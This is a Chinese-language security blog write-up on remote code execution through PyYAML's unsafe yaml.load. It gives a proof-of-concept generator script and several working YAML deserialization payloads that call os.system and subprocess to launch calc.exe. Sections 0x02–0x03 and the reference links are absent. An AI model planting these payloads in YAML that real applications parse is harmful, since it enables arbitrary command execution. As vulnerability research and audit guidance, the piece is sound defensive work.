Author：bit4@[勾陈安全实验室](http://www.polaris-lab.com/)
## 0x01 概述
**什么程序存在漏洞：**
使用了PyYAML这个库并且使用了`yaml.load`而不是`yaml.safe_load`函数来解析yaml文件的程序
**代码审计关键词：**
  * import yaml
  * yaml.load(
**已知相关漏洞：**
  * Remote Code Execution Vulnerability in Ansible-Vault Library. (CVE-2017-2809)
  *  ansible-vault   Constructor.construct_python_object
    !!python/object/apply:    =>  Constructor.construct_python_object_apply
    !!python/object/new:      =>  Constructor.construct_python_object_new
通过如下代码，来序列化test类中的内容：
    # !/usr/bin/env python
    # -*- coding:utf-8 -*-    __author__ = 'bit4'
    __github__ = 'https://github.com/bit4woo'
    __filename__ = 'yaml_gen_poc.py'
    import yaml
    import os
    class test:
        def __init__(self):
            os.system('calc.exe')
    payload =  yaml.dump(test())
    fp = open('simple.yml','w')
    fp.write(payload)
可以看到`simple.yml`中写入的内容如下：
    !!python/object:yaml_gen_poc.test {}
再运行`yaml_verify.py`来验证：
    # !/usr/bin/env python
    # -*- coding:utf-8 -*-    __author__ = 'bit4'
    __github__ = 'https://github.com/bit4woo'
    __filename__ = "yaml_verify.py"
    import yaml
    yaml.load(file('simple.yml', 'r'))
成功执行了命令，弹出计算器。但是`yaml_verify.py`的成功运行，需要依赖`yaml_gen_poc.py`，因为它会根据yml文件中的指引去读取`yaml_gen_poc.py`中的test这个对象（类）。如果删除`yaml_gen_poc.py`，也将运行失败。
## 0x04 构造通用payload
那么我们怎样消除这个依赖呢？就是将其中的类、或者函数 换成python标准库中的类或者函数。
直接修改yml文件为：
    !!python/object:os.system ["calc.exe"]
再运行，失败（显示参数未传递：`TypeError: system() takes exactly 1 argument (0
given)`），尝试查看源码、并变换yml文件中语句格式，均未成功！（疑难点）。
修改为以下2种均成功，通过源码得知，`new`其实是调用了`apply`，他们的不同的地方是创建对象的方式，这里可以大致认为它们是一样的。
    !!python/object/apply:os.system ["calc.exe"]
    !!python/object/new:os.system ["calc.exe"]
既然解决了依赖问题，那我们就尝试构建一些有用的poc吧，从官方标准库里找可以用来执行命令的函数：
    !!python/object/apply:subprocess.check_output [[calc.exe]]
    !!python/object/apply:subprocess.check_output ["calc.exe"]
    !!python/object/apply:subprocess.check_output [["calc.exe"]]
    !!python/object/apply:os.system ["calc.exe"]
    !!python/object/new:subprocess.check_output [["calc.exe"]]
    !!python/object/new:os.system ["calc.exe"]
    ..................
**本文测试代码地址：**
## 0x05 参考
  * 
  * 
  * 